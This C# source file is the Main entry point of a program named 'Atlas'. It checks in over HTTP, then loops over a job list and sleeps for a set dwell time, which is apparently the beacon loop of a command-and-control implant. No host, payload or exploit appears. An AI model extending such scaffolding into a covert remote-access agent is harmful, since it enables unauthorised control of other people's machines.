namespace Atlas
{
    class Program
    {
        public static void Main(string[] args)
        {
            if (Http.CheckIn())
            {
                Utils.JobList JobList = new Utils.JobList
                {
                    job_count = 0,
                    jobs = { }
                };
                while (true)
                {
                    Utils.Loop(JobList);
                    int Dwell = Utils.GetDwellTime();
                    System.Threading.Thread.Sleep(Dwell);
                }
            }
        }
    }
}
